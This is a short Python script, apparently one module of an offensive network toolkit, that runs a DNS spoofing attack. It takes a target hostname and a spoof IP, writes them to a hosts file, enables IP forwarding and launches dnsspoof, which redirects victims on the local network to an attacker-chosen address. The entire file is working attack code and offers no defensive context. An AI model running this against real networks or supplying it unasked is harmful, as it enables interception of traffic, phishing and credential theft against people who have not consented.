#!/usr/bin/env python3
# DNS Spoofing Module

import os, sys, time, subprocess

def run():
    print("\n" + "="*60)
    print("DNS SPOOFING")
    print("="*60)
    
    interface = input("Network interface [eth0]: ").strip() or "eth0"
    hostname = input("Hostname to spoof (e.g., google.com): ").strip()
    spoof_ip = input("Spoof IP address: ").strip()
    
    dns_file = "/tmp/dnsspoof.hosts"
    with open(dns_file, 'w') as f:
        f.write(f"{spoof_ip} {hostname}\n")
    
    print(f"\nStarting DNS spoofing on {interface}")
    print(f"Spoofing {hostname} -> {spoof_ip}")
    print("Press Ctrl+C to stop")
    
    try:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        cmd = f"dnsspoof -i {interface} -f {dns_file}"
        print(f"Running: {cmd}")
        
        subprocess.run(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
    except KeyboardInterrupt:
        print("\nStopping DNS spoofing...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        os.remove(dns_file)
        print("Done")

if __name__ == "__main__":
    run()